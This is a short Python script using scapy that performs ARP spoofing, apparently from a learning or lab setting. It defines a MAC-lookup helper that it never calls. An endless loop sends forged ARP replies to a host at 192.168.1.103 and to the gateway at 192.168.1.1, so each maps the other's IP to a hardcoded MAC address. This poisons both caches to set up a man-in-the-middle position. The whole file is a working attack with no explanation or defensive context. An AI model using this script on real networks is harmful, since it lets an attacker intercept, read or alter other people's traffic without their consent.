#!/usr/bin/env python3

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="2e:68:0f:93:73:33", psrc=spoof_ip)
    scapy.send(packet, verbose=0)

while True:
    spoof("192.168.1.103", "192.168.1.1")
    spoof("192.168.1.1", "192.168.1.103")
    time.sleep(2)